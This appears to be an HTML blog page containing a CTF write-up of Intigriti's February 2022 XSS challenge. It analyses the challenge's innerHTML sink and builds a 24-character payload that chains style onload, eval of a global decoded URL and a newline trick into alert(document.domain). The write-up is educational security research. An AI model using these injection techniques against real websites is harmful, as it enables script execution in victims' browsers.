@@ -1,0 +1,276 @@
+<!DOCTYPE html>
+<html lang="en-us" dir="ltr" data-bs-theme="dark">
+<head>
+  <meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Intigriti&#39;s XSS Challenge (February 2022) | Mystify</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Fira+Code:wght@300..700&family=Libre+Baskerville:ital,wght@0,400..700;1,400..700&family=Playfair+Display:ital,wght@0,400..900;1,400..900&display=swap" rel="stylesheet">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/bootstrap/5.3.8/css/bootstrap.min.css"
+  integrity="sha512-2bBQCjcnw658Lho4nlXJcc6WkV/UxpE/sAokbXPxQNGqmNdQrWqtw26Ns9kFF/yG792pKR1Sx8/Y1Lf1XN4GKA==" crossorigin="anonymous"
+  referrerpolicy="no-referrer" />
+<link rel="stylesheet" href="/css/main.min.27b43d01a5c4432e35e87df4c1026d71d0e56b69b492a4e65a5564c213f27fa9.css" integrity="sha256-J7Q9AaXEQy416H30wQJtcdDla2m0kqTmWlVkwhPyf6k=" crossorigin="anonymous">
+<link rel="stylesheet" href="/css/prism.min.ebb6c0bd3fe6ed4e16ec09f3b52903ee18ddfb21e33b6882030d951a91b213e4.css" integrity="sha256-67bAvT/m7U4W7AnztSkD7hjd&#43;yHjO2iCAw2VGpGyE&#43;Q=" crossorigin="anonymous">
+
+<script src="https://cdnjs.cloudflare.com/ajax/libs/bootstrap/5.3.8/js/bootstrap.min.js"
+  integrity="sha512-nKXmKvJyiGQy343jatQlzDprflyB5c+tKCzGP3Uq67v+lmzfnZUi/ZT+fc6ITZfSC5HhaBKUIvr/nTLCV+7F+Q==" crossorigin="anonymous"
+  referrerpolicy="no-referrer"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.7.1/jquery.min.js"
+  integrity="sha512-v2CJ7UaYy4JwqLDIrZUI/4hqeoQieOmAZNXBeQyjo21dadnwR+8ZaIJVT8EE2iyI61OV8e6M8PP2/4hpQINQ/g==" crossorigin="anonymous"
+  referrerpolicy="no-referrer"></script>
+        <script src="/js/main.f2979a93a325fecf9605263bd141398a311c8e23388ed7dcff74f92f7e632866.js" integrity="sha256-8peak6Ml/s&#43;WBSY70UE5ijEcjiM4jtfc/3T5L35jKGY=" crossorigin="anonymous"></script>
+        <script src="/js/prism.0ecb34b0181efd0f9aa6d1a8fc2e4814ffbdd9acc78d93d02a94e01f64f87f35.js" integrity="sha256-Dss0sBge/Q&#43;aptGo/C5IFP&#43;92azHjZPQKpTgH2T4fzU=" crossorigin="anonymous"></script>
+
+
+
+</head>
+<body class="overflow-y-scroll">
+  <nav class="navbar navbar-expand-lg sticky-top bg-body-tertiary">
+  <div class="container">
+    <a class="navbar-brand" href="/">Mystify</a>
+
+    <button class="navbar-toggler" type="button" data-bs-toggle="collapse" data-bs-target="#navbarNavAltMarkup" aria-controls="navbarNavAltMarkup" aria-expanded="false" aria-label="Toggle navigation">
+      <span class="navbar-toggler-icon"></span>
+    </button>
+    <div class="collapse navbar-collapse" id="navbarNavAltMarkup">
+      <div class="navbar-nav">
+        
+        
+          <a class="nav-link " href="/about-me/">
+            About Me 
+          </a>
+        
+          <a class="nav-link " href="/blogroll/">
+            Blogroll 
+          </a>
+        
+          <a class="nav-link " href="/crypto-in-ctf/">
+            Crypto in CTF 
+          </a>
+        
+      </div>
+    </div>
+  </div>
+</nav>
+
+  <main>
+    <div class="container mt-3">
+      
+  <div class="row justify-content-center">
+    <div class="col-8">
+      <h1 class="post-title">Intigriti&#39;s XSS Challenge (February 2022)</h1>
+
+      
+      <div class="text-muted pb-4">
+        
+          
+          
+          <time datetime="2022-02-14T10:00:00&#43;08:00">2022-02-14</time>
+        
+        
+        <span class="px-1">::</span>
+        
+        
+          <span class="badge rounded-pill bg-secondary">
+            <a href="https://mystiz.hk/tags/ctf/" class="text-muted text-decoration-none">#ctf</a>
+          </span>
+        
+          <span class="badge rounded-pill bg-secondary">
+            <a href="https://mystiz.hk/tags/xss/" class="text-muted text-decoration-none">#xss</a>
+          </span>
+        
+          <span class="badge rounded-pill bg-secondary">
+            <a href="https://mystiz.hk/tags/intigriti-challenge/" class="text-muted text-decoration-none">#intigriti-challenge</a>
+          </span>
+        
+      </div>
+      
+
+      <div class="post-content js-toc-content"><div>
+          <p>This is another round of <a href="https://twitter.com/intigriti" target="_blank" rel="nofollow">@intigriti</a>'s XSS challenge, and this time it is written by <a href="https://twitter.com/aszx87410" target="_blank" rel="nofollow">@aszx87410</a>. I spent around four hours solving it.</p>
+<h2 id="challenge-summary">Challenge Summary<a href="#challenge-summary" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
+<p>We are given a form that allows us a create a character. We are allowed to</p>
+<ul>
+<li>choose a name (shorter than 24 characters), and</li>
+<li>inform if we have played the game.</li>
+</ul>
+<p>We will be redirected to <code>/challenge/xss.html?q=mystiz&amp;first=yes</code> (if you are <code>mystiz</code> who is not a first-timer to the game). A modal containing the name will be popped.</p>
+
+
+<figure>
+  <img src="/images/2022-02-14-intigriti-xss/submitted-dialog.png" title="Welcome back!">
+  
+  <figcaption>Welcome back!</figcaption>
+  
+</figure>
+
+<p>The Javascript code is pretty compact. The snipped code is contains the logic that shows a prompt:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-javascript" data-lang="javascript"><span class="line"><span class="cl"><span class="nb">window</span><span class="p">.</span><span class="nx">name</span> <span class="o">=</span> <span class="s1">&#39;XSS(eXtreme Short Scripting) Game&#39;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kd">function</span> <span class="nx">showModal</span><span class="p">(</span><span class="nx">title</span><span class="p">,</span> <span class="nx">content</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="kd">var</span> <span class="nx">titleDOM</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nx">querySelector</span><span class="p">(</span><span class="s1">&#39;#main-modal h3&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">  <span class="kd">var</span> <span class="nx">contentDOM</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nx">querySelector</span><span class="p">(</span><span class="s1">&#39;#main-modal p&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">  <span class="nx">titleDOM</span><span class="p">.</span><span class="nx">innerHTML</span> <span class="o">=</span> <span class="nx">title</span>
+</span></span><span class="line"><span class="cl">  <span class="nx">contentDOM</span><span class="p">.</span><span class="nx">innerHTML</span> <span class="o">=</span> <span class="nx">content</span>
+</span></span><span class="line"><span class="cl">  <span class="nb">window</span><span class="p">[</span><span class="s1">&#39;main-modal&#39;</span><span class="p">].</span><span class="nx">classList</span><span class="p">.</span><span class="nx">remove</span><span class="p">(</span><span class="s1">&#39;hide&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">// code for submit form omitted
+</span></span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="nx">location</span><span class="p">.</span><span class="nx">href</span><span class="p">.</span><span class="nx">includes</span><span class="p">(</span><span class="s1">&#39;q=&#39;</span><span class="p">))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="kd">var</span> <span class="nx">uri</span> <span class="o">=</span> <span class="nb">decodeURIComponent</span><span class="p">(</span><span class="nx">location</span><span class="p">.</span><span class="nx">href</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">  <span class="kd">var</span> <span class="nx">qs</span> <span class="o">=</span> <span class="nx">uri</span><span class="p">.</span><span class="nx">split</span><span class="p">(</span><span class="s1">&#39;&amp;first=&#39;</span><span class="p">)[</span><span class="mi">0</span><span class="p">].</span><span class="nx">split</span><span class="p">(</span><span class="s1">&#39;?q=&#39;</span><span class="p">)[</span><span class="mi">1</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span><span class="nx">qs</span><span class="p">.</span><span class="nx">length</span> <span class="o">&gt;</span> <span class="mi">24</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">showModal</span><span class="p">(</span><span class="s1">&#39;Error!&#39;</span><span class="p">,</span> <span class="s2">&#34;Length exceeds 24, keep it short!&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">  <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">showModal</span><span class="p">(</span><span class="s1">&#39;Welcome back!&#39;</span><span class="p">,</span> <span class="nx">qs</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">  <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></div><h2 id="solution">Solution<a href="#solution" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
+<p>The content is rendered via <code>innerHTML</code> inside <code>showModal</code>. We know <code>innerHTML</code> might lead to XSS and this is definitely something to be exploited.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-javascript" data-lang="javascript"><span class="line"><span class="cl"><span class="kd">function</span> <span class="nx">showModal</span><span class="p">(</span><span class="nx">title</span><span class="p">,</span> <span class="nx">content</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="kd">var</span> <span class="nx">titleDOM</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nx">querySelector</span><span class="p">(</span><span class="s1">&#39;#main-modal h3&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">  <span class="kd">var</span> <span class="nx">contentDOM</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nx">querySelector</span><span class="p">(</span><span class="s1">&#39;#main-modal p&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">  <span class="nx">titleDOM</span><span class="p">.</span><span class="nx">innerHTML</span> <span class="o">=</span> <span class="nx">title</span>
+</span></span><span class="line"><span class="cl">  <span class="nx">contentDOM</span><span class="p">.</span><span class="nx">innerHTML</span> <span class="o">=</span> <span class="nx">content</span>
+</span></span><span class="line"><span class="cl">  <span class="nb">window</span><span class="p">[</span><span class="s1">&#39;main-modal&#39;</span><span class="p">].</span><span class="nx">classList</span><span class="p">.</span><span class="nx">remove</span><span class="p">(</span><span class="s1">&#39;hide&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></div><p>If we send a name from the form, it is reflected on the <code>q=</code> parameter and we are able to control <code>content</code> in the <code>showModel</code> function (as long as the length of the <code>content</code> is not longer than 24 characters).</p>
+<p>If we could set the name to <code>&lt;img src='x' onerror='alert(document.domain)'&gt;</code>, then we are able to pop an alert. Unfortunately, the payload is 46-character long, which is almost twice the size limit.</p>
+<p>We can observe from the below snippet that <code>qs</code> (the name) is computed by extracting the string within <code>?q=</code> and <code>&amp;first=</code> from the decoded URL (via <code>decodeURIComponent</code>). Also, the decoded URL is stored in a <code>uri</code> variable.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-javascript" data-lang="javascript"><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="nx">location</span><span class="p">.</span><span class="nx">href</span><span class="p">.</span><span class="nx">includes</span><span class="p">(</span><span class="s1">&#39;q=&#39;</span><span class="p">))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="kd">var</span> <span class="nx">uri</span> <span class="o">=</span> <span class="nb">decodeURIComponent</span><span class="p">(</span><span class="nx">location</span><span class="p">.</span><span class="nx">href</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">  <span class="kd">var</span> <span class="nx">qs</span> <span class="o">=</span> <span class="nx">uri</span><span class="p">.</span><span class="nx">split</span><span class="p">(</span><span class="s1">&#39;&amp;first=&#39;</span><span class="p">)[</span><span class="mi">0</span><span class="p">].</span><span class="nx">split</span><span class="p">(</span><span class="s1">&#39;?q=&#39;</span><span class="p">)[</span><span class="mi">1</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span><span class="nx">qs</span><span class="p">.</span><span class="nx">length</span> <span class="o">&gt;</span> <span class="mi">24</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">showModal</span><span class="p">(</span><span class="s1">&#39;Error!&#39;</span><span class="p">,</span> <span class="s2">&#34;Length exceeds 24, keep it short!&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">  <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">showModal</span><span class="p">(</span><span class="s1">&#39;Welcome back!&#39;</span><span class="p">,</span> <span class="nx">qs</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">  <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></div><p><code>uri</code> is ill-fortuned owing to the following reasons:</p>
+<ul>
+<li>it is declared via the <code>var</code> keyword, which is scoped globally (i.e., can be referenced everywhere), and</li>
+<li>it is decoded via <code>decodeURIComponent</code>, which we will explain below.</li>
+</ul>
+<p>Now we can shorten the code for the alert. Instead of <code>alert(document.domain)</code>, we can use <code>eval(uri)</code>... Only if the URI can be executed anyway. However, a normal-looking URI would raise the below error upon <code>eval(uri)</code>:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-plaintext" data-lang="plaintext"><span class="line"><span class="cl">Uncaught SyntaxError: expected expression, got end of script
+</span></span></code></pre></div><p>This is because <code>http://[WHATEVER]</code> is simply <code>http:</code> with comments followed. We wish we could do something like <code>http:alert(1)</code>. Luckily, <code>http://[WHATEVER]%0Aalert(1)</code> is converted to the below <code>uri</code>. This would trigger an alert when evaluated:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-javascript" data-lang="javascript"><span class="line"><span class="cl"><span class="nx">http</span><span class="o">:</span><span class="err">​</span><span class="c1">//WHATEVER
+</span></span></span><span class="line"><span class="cl"><span class="nx">alert</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+</span></span></code></pre></div><p>Implementing this in the challenge webpage is simple. We will use the below URL:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-plaintext" data-lang="plaintext"><span class="line"><span class="cl">https://challenge-0222.intigriti.io/challenge/xss.html?q=%3Cimg%20src=x%20onerror=eval(uri)%3E&amp;first=%0Aalert(document.domain)
+</span></span></code></pre></div><p>Then the variable <code>uri</code> becomes</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-plaintext" data-lang="plaintext"><span class="line"><span class="cl">https://challenge-0222.intigriti.io/challenge/xss.html?q=&lt;img src=x onerror=eval(uri)&gt;&amp;first=
+</span></span><span class="line"><span class="cl">alert(document.domain)
+</span></span></code></pre></div><p>It is pretty good, except that it is 5 characters longer than the limit. I looked up on the HTML tags those support <code>onload</code> and <code>onerror</code>. I eventually found that <code>style</code> supports <code>onload</code>. By replacing <code>&lt;img src=x onerror=...&gt;</code> to <code>&lt;style onload=...&gt;</code>, the payload is barely 24 characters long. Thus we have the final payload:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-plaintext" data-lang="plaintext"><span class="line"><span class="cl">https://challenge-0222.intigriti.io/challenge/xss.html?q=%3Cstyle%20onload=eval(uri)%3E&amp;first=%0Aalert(document.domain)
+</span></span></code></pre></div>
+        </div></div>
+
+      
+      <aside class="toc-container">
+        <a href="#" class="toc-title-link">
+          Intigriti's XSS Challenge (February 2022)
+        </a>
+        <div class="js-toc"></div>
+      </aside>
+      
+
+      
+      <div class="py-3">
+        
+          <a class="btn" href="/posts/2022/2022-02-19-mocsctf/">← MOCSCTF 2022 Postmortem</a>
+        
+
+        
+          <a class="btn float-end" href="/posts/2022/2022-02-08-dicectf-commitment/">DiceCTF 2022 (I): commitment-issues →</a>
+        
+      </div>
+      
+
+    </div>
+  </div>
+
+    </div>
+  </main>
+  <div class="container">
+  <footer class="py-3 my-4 border-top">
+    <p class="text-center text-body-secondary">&copy; 2025 Powered by <em>Hugo</em>. Theme crafted by <em>Mystiz</em> with Bootstrap 5, inspired from <em>Terminal</em>.</p>
+  </footer>
+</div>
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.16.27/dist/katex.min.css"
+  integrity="sha384-Pu5+C18nP5dwykLJOhd2U4Xen7rjScHN/qusop27hdd2drI+lL5KvX7YntvT8yew" crossorigin="anonymous">
+<script defer src="https://cdn.jsdelivr.net/npm/katex@0.16.27/dist/katex.min.js"
+  integrity="sha384-2B8pfmZZ6JlVoScJm/5hQfNS2TI/6hPqDZInzzPc8oHpN5SgeNOf4LzREO6p5YtZ" crossorigin="anonymous"></script>
+<script defer src="https://cdn.jsdelivr.net/npm/katex@0.16.27/dist/contrib/auto-render.min.js"
+  integrity="sha384-hCXGrW6PitJEwbkoStFjeJxv+fSOOQKOPbJxSfM6G5sWZjAyWhXiTIIAmQqnlLlh" crossorigin="anonymous"
+  onload="renderMathInElement(document.body, { delimiters: [{ left: '$$', right: '$$', display: true }, { left: '\\[', right: '\\]', display: true }, { left: '$', right: '$', display: false }, { left: '\\(', right: '\\)', display: false }], trust: true })"></script>
+
+<script src="https://cdn.jsdelivr.net/npm/@viz-js/viz@3.24.0/dist/viz-global.min.js"></script>
+<script>
+Viz.instance().then(viz => {
+  const unescape = function (s) {
+    const t = s.replace(/&amp;/g, '&')
+    return t.replace(/&lt;/g, '<').replace(/&gt;/g, '>').replace(/&#34;/g, '"')
+  }
+
+  document.querySelectorAll('[class=graphviz]').forEach(node => {
+    const source = unescape(node.innerText);
+    console.log(source);
+    const svg = viz.renderSVGElement(source, { engine: 'dot' });
+    console.log(2);
+    node.parentNode.appendChild(svg);
+    node.style.display = 'none';
+  });
+});
+</script>
+
+
+<script src="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.36.4/tocbot.min.js"
+  integrity="sha512-BZUSsJAPNtkd+kdY/bD7hvQKZ5zlgWt++KGy/Pa/5uEJNgs0jZ6JaX6MuclRUanowuxmhb5S3LRPEa3QmrUVfA==" crossorigin="anonymous"
+  referrerpolicy="no-referrer"></script>
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.36.4/tocbot.min.css"
+  integrity="sha512-/ANQiHMqpRl+E0zEAd250N21OOmJsYbhiJWY0Y8yG0TII47yZn1+gDNobMlf+h/FTyImprLXYgXbX3bCYyq/vg==" crossorigin="anonymous"
+  referrerpolicy="no-referrer" />
+<script type="text/javascript">
+tocbot.init({
+  headingSelector: 'h1, h2, h3, h4',
+  orderedList: false,
+  collapseDepth: 2,
+  headingsOffset: 60,
+  scrollSmoothOffset: -60
+})
+</script>
+
+
+<script>
+  document.querySelectorAll('pre code').forEach(el => {
+    console.log(el)
+    const lang = Array.from(el.classList).find(className => className.startsWith('language-'));
+    if (!lang) return;
+
+    
+    if (lang.startsWith('language-diff-')) {
+      el.classList.add('diff-highlight');
+    }
+  })
+</script>
+<script src="https://cdn.jsdelivr.net/npm/mermaid/dist/mermaid.min.js"></script>
+<script>
+mermaid.initialize({
+  startOnLoad: true,
+  htmlLabels: true,
+  securityLevel: "loose",
+  theme: 'base',
+  themeVariables: {
+    background: '#22222c',
+    primaryColor: '#33333c',
+    primaryTextColor: '#ffe4e1',
+  }
+});
+</script>
+
+</body>
+</html>
